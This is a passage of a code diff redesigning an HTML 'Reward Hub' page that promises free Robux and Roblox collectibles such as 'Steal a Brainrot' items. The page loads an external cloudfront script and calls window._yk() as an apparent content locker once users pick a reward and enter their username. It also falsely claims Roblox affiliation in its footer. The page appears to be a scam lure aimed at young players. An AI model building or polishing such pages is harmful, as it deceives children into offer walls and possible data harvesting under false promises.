@@ -17,14 +17,15 @@
       --page: #f3f4f6;
     }
 
-    * { box-sizing: border-box; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
       margin: 0;
       min-height: 100vh;
       background: var(--page);
       color: var(--ink);
-      font-family: Montserrat, Arial, Helvetica, sans-serif;
+      font-family: 'Montserrat', 'Poppins', Arial, sans-serif;
+      overflow-x: hidden;
     }
 
     body.landing-active {
@@ -33,10 +34,35 @@
     }
 
     button, input { font: inherit; }
-    button { cursor: pointer; border: 0; }
+    button { cursor: pointer; border: 0; background: none; }
     .hidden { display: none !important; }
 
-    /* Landing screen */
+    /* ---------- BACK ARROW (global) ---------- */
+    .back-arrow {
+      position: fixed;
+      top: 20px;
+      left: 20px;
+      z-index: 2147483700;
+      width: 44px;
+      height: 44px;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(8px);
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: transform 0.2s, background 0.2s;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      font-size: 24px;
+      color: white;
+    }
+    .back-arrow:hover {
+      transform: scale(1.05);
+      background: rgba(0, 0, 0, 0.8);
+    }
+
+    /* ---------- LANDING SCREEN (redesigned, dynamic, symmetric, mobile-first) ---------- */
     .landing-screen {
       position: fixed;
       inset: 0;
@@ -46,582 +72,189 @@
       justify-content: center;
       min-height: 100vh;
       padding: 20px;
-      background: #0a0f1a;
-      font-family: Nunito, Montserrat, Arial, sans-serif;
+      background: linear-gradient(145deg, #0b1120 0%, #111827 100%);
+      font-family: 'Poppins', 'Montserrat', sans-serif;
+      overflow-y: auto;
     }
 
     .landing-screen.is-hidden {
       display: none;
     }
 
-    #stars {
+    /* animated stars background */
+    #starsCanvas {
       position: fixed;
-      inset: 0;
-      z-index: 0;
-      pointer-events: none;
-    }
-
-    .landing-card {
-      position: relative;
-      z-index: 1;
-      width: min(420px, 95vw);
-      margin: 0 auto;
-      padding: 48px 56px 40px;
-      border: 1px solid rgba(255, 255, 255, .07);
-      border-radius: 20px;
-      background: #161b27;
-      text-align: center;
-      box-shadow: 0 24px 64px rgba(0, 0, 0, .5);
-      animation: landingCardIn .7s cubic-bezier(.22, 1, .36, 1) both;
-    }
-
-    .landing-logo {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      width: 88px;
-      height: 88px;
-      margin: 0 auto 20px;
-      border: 4px solid #fff;
-      border-radius: 50%;
-      background: #2d56ff;
-      color: #fff;
-      font-size: 48px;
-      font-weight: 900;
-      font-family: Impact, fantasy;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, .35);
-      animation: landingLogoPulse 3s ease-in-out infinite;
-    }
-
-    .landing-card h1 {
-      margin: 0 0 6px;
-      color: #e8eaf6;
-      font-family: Impact, fantasy;
-      font-size: 32px;
-      font-weight: 900;
-    }
-
-    .landing-card .subtitle {
-      margin: 0 0 32px;
-      color: #6b7280;
-      font-size: 14px;
-      font-weight: 800;
-    }
-
-    .landing-actions {
-      display: flex;
-      flex-direction: column;
-      gap: 14px;
-    }
-
-    .landing-btn {
+      top: 0;
+      left: 0;
       width: 100%;
-      padding: 16px;
-      border-radius: 999px;
-      color: #fff;
-      font-family: Impact, fantasy;
-      font-size: 20px;
-      letter-spacing: .5px;
-      transition: transform .2s ease, filter .2s ease;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
     }
 
-    .landing-btn:hover {
-      transform: translateY(-2px);
-      filter: brightness(1.1);
-    }
-
-    .landing-btn.cyan {
-      background: linear-gradient(90deg, #00c9f7, #00d4ff);
-      box-shadow: 0 6px 20px rgba(0, 212, 255, .3);
-    }
-
-    .landing-btn.red {
-      background: linear-gradient(90deg, #c72b2b, #e03535);
-      box-shadow: 0 6px 20px rgba(224, 53, 53, .3);
-    }
-
-    .landing-btn.green {
-      background: linear-gradient(90deg, #20a832, #27c93f);
-      box-shadow: 0 6px 20px rgba(39, 201, 63, .3);
-    }
-
-    .landing-card footer {
-      margin-top: 24px;
-      color: rgba(232, 234, 246, .62);
-      font-size: 12px;
-      font-weight: 800;
-    }
-
-    .landing-toast {
-      position: fixed;
-      left: 50%;
-      bottom: 32px;
-      z-index: 2147483600;
-      padding: 12px 24px;
-      border-radius: 999px;
-      background: #1e2535;
-      color: #fff;
-      opacity: 0;
-      transform: translateX(-50%) translateY(80px);
-      transition: opacity .3s ease, transform .3s ease;
-      font-weight: 800;
-    }
-
-    .landing-toast.show {
-      opacity: 1;
-      transform: translateX(-50%) translateY(0);
-    }
-
-    /* Collector styles (unchanged) */
-    .collector-app {
-      min-height: 100vh;
-      padding: 18px 14px 42px;
-      color: #e8fbff;
-      background:
-        radial-gradient(circle at 22% 18%, rgba(0, 212, 255, .22), transparent 22rem),
-        radial-gradient(circle at 80% 8%, rgba(147, 51, 234, .20), transparent 24rem),
-        linear-gradient(135deg, #061a2b, #07101f 58%, #030712);
-      font-family: Montserrat, Arial, sans-serif;
-    }
-
-    .collector-app.brainrot {
-      background:
-        radial-gradient(circle at 16% 16%, rgba(224, 53, 53, .20), transparent 24rem),
-        radial-gradient(circle at 84% 12%, rgba(147, 51, 234, .22), transparent 24rem),
-        linear-gradient(135deg, #180914, #0d1020 58%, #030712);
-    }
-
-    .collector-shell {
-      width: min(1120px, 100%);
-      margin: 0 auto;
-    }
-
-    .collector-header {
-      display: grid;
-      justify-items: center;
-      gap: 12px;
-      padding: 12px 0 22px;
-      text-align: center;
-    }
-
-    .collector-logo {
-      display: grid;
-      place-items: center;
-      width: 96px;
-      height: 96px;
-      border: 4px solid rgba(255, 255, 255, .92);
-      border-radius: 28px;
-      background: linear-gradient(135deg, #00d4ff, #27c93f);
-      box-shadow: 0 0 34px rgba(0, 212, 255, .28);
-      font-size: 48px;
-      animation: rewardBeat 1.7s infinite;
-    }
-
-    .brainrot .collector-logo {
-      background: linear-gradient(135deg, #e03535, #9333ea);
-      box-shadow: 0 0 34px rgba(224, 53, 53, .28);
-    }
-
-    .collector-header h1 {
-      margin: 0;
-      color: #fff;
-      font-size: clamp(30px, 6vw, 54px);
-      text-shadow: 0 0 18px rgba(0, 212, 255, .25);
-    }
-
-    .collector-header p {
-      margin: 0;
-      color: rgba(232, 251, 255, .74);
-      font-weight: 800;
-    }
-
-    .active-strip {
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      margin: 6px auto 18px;
-      padding: 13px 18px;
-      border: 1px solid rgba(191, 233, 255, .18);
-      border-radius: 13px;
-      background: rgba(6, 26, 43, .82);
-      backdrop-filter: blur(4px);
-      box-shadow: 0 12px 28px rgba(0, 0, 0, .24);
-      font-weight: 900;
-    }
-
-    .active-strip strong {
-      color: #39ff14;
-      font-size: 21px;
-      text-shadow: 0 0 12px rgba(57, 255, 20, .38);
-    }
-
-    .select-line {
-      margin: 12px 0 22px;
-      text-align: center;
-      color: #fff;
-      font-size: 24px;
-      font-weight: 900;
-    }
-
-    .item-grid {
-      display: grid;
-      grid-template-columns: repeat(4, minmax(0, 1fr));
-      gap: 16px;
-    }
-
-    .loot-card {
+    .landing-container {
       position: relative;
-      display: grid;
-      gap: 10px;
-      min-height: 172px;
-      padding: 14px 10px;
-      overflow: hidden;
-      border: 1px solid rgba(255, 255, 255, .20);
-      border-radius: 14px;
-      background: linear-gradient(180deg, rgba(255, 255, 255, .94), rgba(232, 249, 255, .92));
-      color: #0f172a;
-      text-align: center;
-      box-shadow: 0 14px 28px rgba(0, 0, 0, .20);
-      transition: transform .22s ease, box-shadow .22s ease;
-      cursor: pointer;
-    }
-
-    .loot-card:hover {
-      transform: translateY(-6px) scale(1.02);
-      border-color: rgba(0, 212, 255, .65);
-      box-shadow: 0 20px 34px rgba(0, 0, 0, .28), 0 0 22px rgba(0, 212, 255, .16);
-    }
-
-    .brainrot .loot-card:hover {
-      border-color: rgba(224, 53, 53, .60);
-      box-shadow: 0 20px 34px rgba(0, 0, 0, .28), 0 0 22px rgba(224, 53, 53, .16);
-    }
-
-    .loot-art {
-      display: grid;
-      place-items: center;
-      width: 86px;
-      height: 86px;
+      z-index: 2;
+      width: 100%;
+      max-width: 480px;
       margin: 0 auto;
-      border-radius: 24px;
-      background: linear-gradient(135deg, rgba(0, 212, 255, .18), rgba(39, 201, 63, .16));
-      font-size: 44px;
-    }
-
-    .brainrot .loot-art {
-      background: linear-gradient(135deg, rgba(224, 53, 53, .18), rgba(147, 51, 234, .16));
-    }
-
-    .loot-name {
-      display: grid;
-      place-items: center;
-      min-height: 42px;
-      font-size: 14px;
-      font-weight: 900;
-      line-height: 1.2;
-    }
-
-    .rarity {
-      justify-self: center;
-      padding: 5px 10px;
-      border-radius: 999px;
-      background: #111827;
-      color: #fff;
-      font-size: 10px;
-      font-weight: 900;
-      letter-spacing: .7px;
-    }
-
-    .loot-card[data-rarity="OG"] { border-top: 4px solid #f5ff69; }
-    .loot-card[data-rarity="Celestial"] { border-top: 4px solid #ff7ef9; }
-    .loot-card[data-rarity="Secret"] { border-top: 4px solid #e9080c; }
-    .loot-card[data-rarity="Rare"] { border-top: 4px solid #3b82f6; }
-    .loot-card[data-rarity="Mythic"] { border-top: 4px solid #a855f7; }
-    .loot-card[data-rarity="Limited"] { border-top: 4px solid #f97316; }
-    .loot-card[data-rarity="VIP"] { border-top: 4px solid #ec4899; }
-
-    .item-modal {
-      position: fixed;
-      inset: 0;
-      z-index: 2147483600;
-      display: none;
-      place-items: center;
-      padding: 18px;
-      background: rgba(0, 0, 0, .72);
-      backdrop-filter: blur(8px);
-    }
-
-    .item-modal.visible {
-      display: grid;
-    }
-
-    .item-dialog {
-      width: min(430px, 100%);
-      padding: 24px;
-      border: 1px solid rgba(255, 255, 255, .16);
-      border-radius: 20px;
-      background: linear-gradient(180deg, #111827, #060b16);
-      color: #fff;
-      text-align: center;
-      box-shadow: 0 28px 80px rgba(0, 0, 0, .5);
-    }
-
-    .modal-art {
-      display: grid;
-      place-items: center;
-      width: 98px;
-      height: 98px;
-      margin: 6px auto 14px;
-      border-radius: 28px;
-      background: rgba(255, 255, 255, .08);
-      font-size: 56px;
-    }
-
-    .loader-ring {
-      width: 64px;
-      height: 64px;
-      border: 6px solid rgba(255, 255, 255, .18);
-      border-top-color: #00d4ff;
-      border-radius: 50%;
-      animation: rotate-loader 700ms linear infinite;
-      margin: 0 auto 16px;
-    }
-
-    .dialog-actions {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-      margin-top: 16px;
-    }
-
-    .small-btn {
-      min-height: 48px;
-      border-radius: 10px;
-      font-weight: 900;
-      transition: transform .2s ease;
-    }
-
-    .small-btn.cancel { background: #374151; color: white; }
-    .small-btn.continue { background: linear-gradient(90deg, #00c9f7, #27c93f); color: white; }
-    .brainrot .small-btn.continue { background: linear-gradient(90deg, #e03535, #9333ea); }
-
-    .collector-toast-wrap {
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      z-index: 2147483500;
-    }
-
-    .collector-toast {
-      background: #061a2be6;
-      backdrop-filter: blur(8px);
-      border-radius: 40px;
-      padding: 8px 16px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      border: 1px solid #39ff14;
-      margin-top: 8px;
-      animation: toastSlide 0.3s ease-out;
-    }
-
-    @keyframes toastSlide {
-      from { opacity: 0; transform: translateX(-30px); }
-      to { opacity: 1; transform: translateX(0); }
-    }
-
-    /* RBX styles - enhanced for side-by-side cards on mobile & dynamic user details */
-    .app { width: min(100%, 560px); margin: 0 auto; padding: 24px 16px 36px; }
-    .brand { display: grid; justify-items: center; gap: 10px; text-align: center; margin-bottom: 18px; }
-    .brand-mark { position: relative; width: 230px; }
-    .brand-logo { width: 100%; display: block; }
-    .year { position: absolute; right: 3px; top: 10px; padding: 4px 9px; border-radius: 999px; background: #232527; color: white; font-size: 12px; font-weight: 900; }
-    h1 { margin: 0; color: var(--purple); font-size: 30px; font-weight: 900; }
-    .subhead { margin: 0; color: var(--muted); font-size: 14px; font-weight: 500; }
-    .metrics { position: relative; overflow: hidden; padding: 14px; margin-bottom: 20px; border: 2px solid rgba(255, 255, 255, .85); border-radius: 16px; background: rgba(255, 255, 255, .94); box-shadow: 0 16px 32px rgba(35, 37, 39, .12); }
-    .metrics::before { content: ""; position: absolute; inset: -50%; background: radial-gradient(circle, rgba(16, 185, 129, .13), transparent 62%); animation: spin 15s linear infinite; }
-    .live { position: relative; z-index: 1; display: flex; justify-content: center; margin-bottom: 8px; }
-    .live span { display: inline-flex; align-items: center; gap: 6px; padding: 4px 9px; border-radius: 999px; background: rgba(239, 68, 68, .13); color: #ef4444; font-size: 10px; font-weight: 900; }
-    .dot { width: 7px; height: 7px; border-radius: 50%; background: #ef4444; animation: blink 1.5s infinite; }
-    .metrics h2 { position: relative; z-index: 1; margin: 0 0 12px; text-align: center; color: var(--muted); font-size: 11px; font-weight: 900; text-transform: uppercase; }
-    .metric-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-    .metric-card { padding: 10px; border: 2px solid rgba(16, 185, 129, .28); border-radius: 10px; background: linear-gradient(135deg, rgba(16, 185, 129, .10), rgba(96, 165, 250, .10)); text-align: center; transition: transform .25s ease; animation: breathe 2s infinite; }
-    .metric-card .icon { width: 30px; height: 30px; }
-    .metric-value { color: var(--emerald); font-size: 18px; font-weight: 900; }
-    .metric-name { color: var(--muted); font-size: 9px; font-weight: 900; text-transform: uppercase; }
-    .panel { padding: 22px; margin-bottom: 18px; border-radius: 8px; background: var(--surface); box-shadow: 0 18px 40px rgba(35, 37, 39, .16); }
-    
-    /* Reward cards side by side on mobile */
-    .reward-grid { 
-      display: flex; 
-      gap: 16px; 
-      justify-content: center; 
-      flex-wrap: nowrap;
-    }
-    .choice { 
-      flex: 1;
-      min-width: 0;
-      padding: 20px 12px; 
-      border: 3px solid var(--line); 
-      border-radius: 20px; 
-      background: white; 
-      text-align: center; 
-      transition: 0.2s; 
-      cursor: pointer;
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 10px;
+      gap: 32px;
+      animation: fadeUp 0.8s cubic-bezier(0.2, 0.9, 0.4, 1.1) both;
     }
-    .choice .icon { width: 60px; height: 60px; margin-bottom: 4px; }
-    .choice-title { font-size: 20px; font-weight: 900; }
-    .select-pill { display: inline-block; padding: 6px 12px; border-radius: 40px; background: var(--purple); color: white; font-size: 12px; font-weight: 900; margin-top: 6px; }
-    
-    .amount-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 16px; }
-    .amount { padding: 20px 10px; border: 3px solid var(--line); border-radius: 20px; background: white; text-align: center; cursor: pointer; transition: all 0.2s; }
-    .amount.picked { border-color: var(--purple); background: rgba(147, 51, 234, .08); transform: scale(1.02); }
-    .amount-number { font-size: 28px; font-weight: 900; color: var(--purple); }
-    .available { font-size: 12px; color: var(--muted); margin-top: 6px; }
 
-    /* Enhanced username section with Roblox avatar and dynamic colors */
-    .username-section {
-      background: linear-gradient(135deg, #f8fafc, #ffffff);
-      border-radius: 24px;
-      padding: 24px 20px;
-      margin: 16px 0;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
-      border: 1px solid rgba(147, 51, 234, 0.2);
-    }
-    .input-wrap { 
-      position: relative; 
-      margin-bottom: 20px; 
-      max-width: 100%;
-    }
-    .input-wrap span { 
-      position: absolute; 
-      left: 18px; 
-      top: 50%; 
-      transform: translateY(-50%); 
-      color: #9333ea; 
-      font-weight: 900;
-      font-size: 20px;
-    }
-    input { 
-      width: 100%; 
-      min-height: 64px; 
-      padding: 0 20px 0 52px; 
-      border: 2px solid #e2e8f0; 
-      border-radius: 60px; 
-      background: #fff; 
-      font-size: 18px; 
-      font-weight: 600;
-      transition: all 0.2s;
-    }
-    input:focus { 
-      border-color: #9333ea; 
-      box-shadow: 0 0 0 4px rgba(147, 51, 234, 0.2); 
-      outline: none; 
-    }
-    .primary-btn { 
-      width: 100%; 
-      min-height: 56px; 
-      border-radius: 60px; 
-      background: linear-gradient(90deg, #9333ea, #a855f7); 
-      color: white; 
-      font-weight: 900; 
-      font-size: 18px;
-      transition: transform .2s, filter .2s;
-      box-shadow: 0 4px 12px rgba(147, 51, 234, 0.3);
-    }
-    .primary-btn:hover { transform: scale(1.02); filter: brightness(1.05); }
-    .account { 
-      display: none; 
-      margin-top: 24px; 
-      padding: 20px; 
-      border-radius: 24px; 
-      background: rgba(147, 51, 234, 0.06);
-      border: 1px solid rgba(147, 51, 234, 0.2);
-    }
-    .account.visible { display: block; animation: appear .25s; }
-    
-    .profile {
-      display: flex;
-      align-items: center;
-      gap: 20px;
-      margin-bottom: 20px;
-      flex-wrap: wrap;
-    }
-    .roblox-avatar {
-      width: 80px;
-      height: 80px;
+    /* floating orb / logo */
+    .logo-orb {
+      width: 130px;
+      height: 130px;
+      background: radial-gradient(circle at 30% 30%, #ffd966, #f59e0b);
       border-radius: 50%;
-      background: linear-gradient(145deg, #facc15, #eab308);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 44px;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
-      border: 3px solid white;
+      box-shadow: 0 20px 35px rgba(0,0,0,0.3), 0 0 0 6px rgba(255,215,0,0.2);
+      animation: float 3s ease-in-out infinite, pulseGlow 2.2s infinite;
     }
-    .user-info h3 {
-      margin: 0 0 4px;
-      font-size: 22px;
+    .logo-orb span {
+      font-size: 68px;
       font-weight: 900;
-      color: #1e293b;
+      filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3));
     }
-    .user-info p {
-      margin: 0;
-      color: #64748b;
+
+    .greeting h1 {
+      font-size: 2.2rem;
+      font-weight: 800;
+      text-align: center;
+      background: linear-gradient(135deg, #FFFFFF, #c084fc, #60a5fa);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 8px;
+      letter-spacing: -0.5px;
+    }
+    .greeting p {
+      color: #94a3b8;
+      font-weight: 500;
+      text-align: center;
+      font-size: 0.95rem;
+    }
+
+    /* symmetric button grid */
+    .button-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+      width: 100%;
+      padding: 0 12px;
+    }
+    .action-card {
+      background: rgba(30, 41, 59, 0.7);
+      backdrop-filter: blur(12px);
+      border-radius: 80px;
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      border: 1px solid rgba(255,255,255,0.15);
+      transition: all 0.25s ease;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    }
+    .action-card:hover {
+      transform: translateY(-4px) scale(1.02);
+      background: rgba(45, 55, 80, 0.8);
+      border-color: rgba(255,215,0,0.5);
+    }
+    .card-icon {
+      width: 54px;
+      height: 54px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+    }
+    .card-text {
+      flex: 1;
+      text-align: left;
+    }
+    .card-text h3 {
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: white;
+      margin-bottom: 4px;
+    }
+    .card-text p {
+      font-size: 0.75rem;
+      color: #cbd5e1;
+      font-weight: 500;
+    }
+    .arrow-indicator {
+      font-size: 24px;
+      color: #facc15;
+      transition: transform 0.2s;
+    }
+    .action-card:hover .arrow-indicator {
+      transform: translateX(6px);
+    }
+
+    .footer-note {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 0.7rem;
+      color: #5b6e8c;
+      font-weight: 500;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-12px); }
+      100% { transform: translateY(0px); }
+    }
+    @keyframes pulseGlow {
+      0% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4); }
+      70% { box-shadow: 0 0 0 15px rgba(245, 158, 11, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
+    }
+
+    /* Collector & RBX styles (minimal adjustments for footer) */
+    .collector-app, .app {
+      position: relative;
+      padding-bottom: 70px;
+    }
+    .footer-legal {
+      text-align: center;
+      font-size: 11px;
+      color: #6c757d;
+      margin-top: 30px;
+      padding: 12px;
+      border-top: 1px solid rgba(0,0,0,0.05);
       font-weight: 600;
     }
-    .details-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px;
-      margin-top: 16px;
+    .brainrot .footer-legal, .collector-app .footer-legal {
+      color: #9ca3af;
+      border-top-color: rgba(255,255,255,0.1);
     }
-    .detail-card {
-      background: white;
-      border-radius: 20px;
-      padding: 12px;
-      text-align: center;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
-    }
-    .detail-label {
-      font-size: 12px;
-      font-weight: 800;
-      color: #64748b;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
-    .detail-value {
-      font-size: 16px;
-      font-weight: 900;
-      margin-top: 6px;
-    }
-    .status-online { color: #10b981; }
-    .status-offline { color: #ef4444; }
-    .badge-active { background: #10b98120; color: #10b981; padding: 4px 12px; border-radius: 40px; display: inline-block; font-weight: 900; font-size: 13px; }
-    
-    .gold-icon { filter: drop-shadow(0 0 6px #fbbf24); }
-    .blue-icon { filter: drop-shadow(0 0 6px #3b82f6); }
-    
-    @keyframes spin { to { transform: rotate(360deg); } }
-    @keyframes blink { 50% { opacity: .32; } }
-    @keyframes breathe { 50% { transform: scale(1.04); } }
-    @keyframes rewardBeat { 50% { transform: scale(1.12); } }
-    @keyframes rotate-loader { to { transform: rotate(360deg); } }
-    @keyframes appear { from { opacity: 0; transform: translateY(-12px); } to { opacity: 1; transform: translateY(0); } }
-    @keyframes landingCardIn { from { opacity: 0; transform: translateY(30px) scale(.96); } to { opacity: 1; transform: translateY(0) scale(1); } }
-    @keyframes landingLogoPulse { 50% { box-shadow: 0 8px 40px rgba(0, 0, 0, .5); } }
 
-    @media (max-width: 640px) { 
-      .item-grid { grid-template-columns: repeat(2, 1fr); }
-      .choice { padding: 12px 6px; }
-      .choice .icon { width: 48px; height: 48px; }
-      .choice-title { font-size: 16px; }
-      .profile { flex-direction: column; text-align: center; }
-      .details-grid { grid-template-columns: 1fr; }
+    /* RBX panel adjustments */
+    .app .footer-legal {
+      margin-top: 24px;
+    }
+    /* responsive */
+    @media (max-width: 500px) {
+      .action-card { padding: 12px 18px; }
+      .card-icon { width: 48px; height: 48px; font-size: 28px; }
+      .card-text h3 { font-size: 1.2rem; }
+      .logo-orb { width: 100px; height: 100px; }
+      .logo-orb span { font-size: 52px; }
     }
   </style>
   <script type="text/javascript">
@@ -630,70 +263,175 @@
   <script src="https://d1g1lhd4vferpn.cloudfront.net/e01001f.js"></script>
 </head>
 <body class="landing-active">
+
+  <!-- Back arrow (hidden initially, shown on subpages) -->
+  <div id="globalBackArrow" class="back-arrow" style="display: none;">←</div>
+
+  <!-- LANDING SCREEN (redesigned) -->
   <section class="landing-screen" id="landingScreen">
-    <canvas id="stars"></canvas>
-    <div class="landing-card">
-      <div class="landing-logo">R</div>
-      <h1>Welcome RobloxPlayer!</h1>
-      <p class="subtitle">Unlock Rewards Instantly</p>
-      <div class="landing-actions">
-        <button class="landing-btn cyan" data-entry="rbx">RBX HERE</button>
-        <button class="landing-btn red" data-entry="brainrot">STEAL A BRAINROT</button>
-        <button class="landing-btn green" data-entry="tsunami">ESCAPE TSUNAMI</button>
+    <canvas id="starsCanvas"></canvas>
+    <div class="landing-container">
+      <div class="logo-orb"><span>⭐</span></div>
+      <div class="greeting">
+        <h1>REWARD HUB</h1>
+        <p>Unlock exclusive boosts & collectibles</p>
       </div>
-      <footer>© 2026 | All Rights Reserved</footer>
+      <div class="button-grid">
+        <div class="action-card" data-entry="rbx">
+          <div class="card-icon">💰</div>
+          <div class="card-text"><h3>RBX BOOSTER</h3><p>Get Robux & Diamonds</p></div>
+          <div class="arrow-indicator">→</div>
+        </div>
+        <div class="action-card" data-entry="brainrot">
+          <div class="card-icon">🧠</div>
+          <div class="card-text"><h3>STEAL A BRAINROT</h3><p>Limited collectibles</p></div>
+          <div class="arrow-indicator">→</div>
+        </div>
+        <div class="action-card" data-entry="tsunami">
+          <div class="card-icon">🌊</div>
+          <div class="card-text"><h3>ESCAPE TSUNAMI</h3><p>Rare rewards</p></div>
+          <div class="arrow-indicator">→</div>
+        </div>
+      </div>
+      <div class="footer-note">© 2026 · All rights reserved to Roblox</div>
     </div>
-    <div class="landing-toast" id="landingToast"></div>
   </section>
 
+  <!-- dynamic containers for RBX and collectors -->
   <main class="app hidden" id="generatedApp"></main>
   <div id="collectorContainer" class="hidden"></div>
 
   <script>
-    function showLandingToast(msg) {
-      const toast = document.getElementById('landingToast');
-      toast.textContent = msg;
-      toast.classList.add('show');
-      setTimeout(() => toast.classList.remove('show'), 2000);
+    // Helper: show landing, hide everything else, reset back arrow
+    function showLandingScreen() {
+      document.getElementById('landingScreen').classList.remove('is-hidden');
+      document.getElementById('generatedApp').classList.add('hidden');
+      document.getElementById('collectorContainer').classList.add('hidden');
+      document.body.classList.add('landing-active');
+      const backBtn = document.getElementById('globalBackArrow');
+      backBtn.style.display = 'none';
+      // reset any active locker state if needed
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     }
-    function triggerContentLocker() {
-      if (typeof window._yk === 'function') window._yk();
-      else alert("Unlock system loading, please wait a moment and try again.");
+
+    // Back arrow logic: go back to landing
+    function attachBackArrow() {
+      const backBtn = document.getElementById('globalBackArrow');
+      backBtn.onclick = () => {
+        showLandingScreen();
+      };
     }
-    function setupStars() {
-      const canvas = document.getElementById('stars');
+
+    // Stars animation for landing (dynamic)
+    function initStars() {
+      const canvas = document.getElementById('starsCanvas');
       if (!canvas) return;
       const ctx = canvas.getContext('2d');
       let width, height, stars = [];
       function resize() {
         width = canvas.width = window.innerWidth;
         height = canvas.height = window.innerHeight;
-        stars = Array.from({ length: 100 }, () => ({ x: Math.random() * width, y: Math.random() * height, r: Math.random() * 1.5, a: Math.random() }));
+        stars = [];
+        for (let i = 0; i < 180; i++) {
+          stars.push({
+            x: Math.random() * width,
+            y: Math.random() * height,
+            r: Math.random() * 2.2,
+            alpha: Math.random() * 0.6 + 0.2,
+            speed: 0.2 + Math.random() * 0.5
+          });
+        }
       }
       function draw() {
+        if (!ctx) return;
         ctx.clearRect(0, 0, width, height);
-        stars.forEach(s => { ctx.beginPath(); ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2); ctx.fillStyle = `rgba(255,255,255,${s.a})`; ctx.fill(); });
+        stars.forEach(s => {
+          ctx.beginPath();
+          ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(255, 215, 0, ${s.alpha + Math.sin(Date.now() * 0.002 * s.speed) * 0.2})`;
+          ctx.fill();
+        });
         requestAnimationFrame(draw);
       }
       window.addEventListener('resize', resize);
-      resize(); draw();
+      resize();
+      draw();
     }
-    setupStars();
+    initStars();
 
-    // Collector (Tsunami / Brainrot) - kept same
+    // Trigger locker (unchanged)
+    function triggerContentLocker() {
+      if (typeof window._yk === 'function') window._yk();
+      else alert("Unlock system loading, please wait a moment and try again.");
+    }
+
+    // ------ Collector logic (Tsunami / Brainrot) ------
     const collectorItems = {
-      tsunami: { theme: '', logo: '🌊', title: 'Escape Tsunami Rewards', subtitle: 'Pick a rare item, verify your username, and claim your reward.', items: [["🐘","Strawberry Elephant","OG"],["🍔","Burgerini Bearini","OG"],["🚜","Bulbito Bandito","Rare"],["💎","Alessio","Celestial"],["🌀","Dug Dug Dug","Celestial"],["🏫","Esok Sekolah","Celestial"],["🦬","Bisonte Giuppitere","Secret"],["🐉","Dragon Cannelloni","Secret"],["🦕","Nuclearo Dinossauro","Secret"],["🍋","Perochello Lemonchello","Rare"],["🐧","Salamino Penguino","Rare"],["🕷","Chimpanzini Spiderini","Mythic"]] },
-      brainrot: { theme: 'brainrot', logo: '🧠', title: 'Steal a Brainrot', subtitle: 'Grab a limited Brainrot collectible before the wave hits.', items: [["🐘","Strawberry Elephant","OG"],["🐱","Meowl","OG"],["🚽","Skibidi Toilet","OG"],["🐉","Hydra Dragon","Secret"],["🥤","Fizzy Soda","Rare"],["🐼","Boba Panda","Rare"],["🎄","Festive 67","Limited"],["🍬","Los Candies","Limited"],["🧟","Headless Horseman","Mythic"],["🐋","Capitano Moby","Mythic"],["💰","$1000000","VIP"],["⚡","Admin Commands","VIP"]] }
+      tsunami: {
+        theme: '',
+        logo: '🌊',
+        title: 'Escape Tsunami Rewards',
+        subtitle: 'Pick a rare item, verify your username, and claim your reward.',
+        items: [
+          ["🐘", "Strawberry Elephant", "OG"], ["🍔", "Burgerini Bearini", "OG"], ["🚜", "Bulbito Bandito", "Rare"],
+          ["💎", "Alessio", "Celestial"], ["🌀", "Dug Dug Dug", "Celestial"], ["🏫", "Esok Sekolah", "Celestial"],
+          ["🦬", "Bisonte Giuppitere", "Secret"], ["🐉", "Dragon Cannelloni", "Secret"], ["🦕", "Nuclearo Dinossauro", "Secret"],
+          ["🍋", "Perochello Lemonchello", "Rare"], ["🐧", "Salamino Penguino", "Rare"], ["🕷", "Chimpanzini Spiderini", "Mythic"]
+        ]
+      },
+      brainrot: {
+        theme: 'brainrot',
+        logo: '🧠',
+        title: 'Steal a Brainrot',
+        subtitle: 'Grab a limited Brainrot collectible before the wave hits.',
+        items: [
+          ["🐘", "Strawberry Elephant", "OG"], ["🐱", "Meowl", "OG"], ["🚽", "Skibidi Toilet", "OG"],
+          ["🐉", "Hydra Dragon", "Secret"], ["🥤", "Fizzy Soda", "Rare"], ["🐼", "Boba Panda", "Rare"],
